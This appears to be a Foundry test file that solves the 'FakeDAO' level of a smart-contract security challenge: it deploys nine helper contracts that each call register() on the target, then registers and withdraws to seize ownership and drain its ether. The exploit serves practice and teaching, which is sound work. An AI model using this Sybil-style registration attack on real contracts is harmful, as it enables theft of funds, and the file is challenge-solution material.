// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/10_FakeDAO/FakeDAO.sol";

// forge test --match-contract FakeDAOTest -vvvv
contract FakeDAOTest is BaseTest {
    FakeDAO instance;

    function setUp() public override {
        super.setUp();

        instance = new FakeDAO{value: 0.01 ether}(address(0xDeAdBeEf));
    }

    function testExploitLevel() public {
        for (int i = 0; i < 9; i++) {
            ExploitContract exploit = new ExploitContract(instance);
        }
        instance.register();
        instance.withdraw();
        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.owner() != owner, "Solution is not solving the level");
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}

contract ExploitContract {
    constructor(FakeDAO instance) {
        instance.register();
    }
}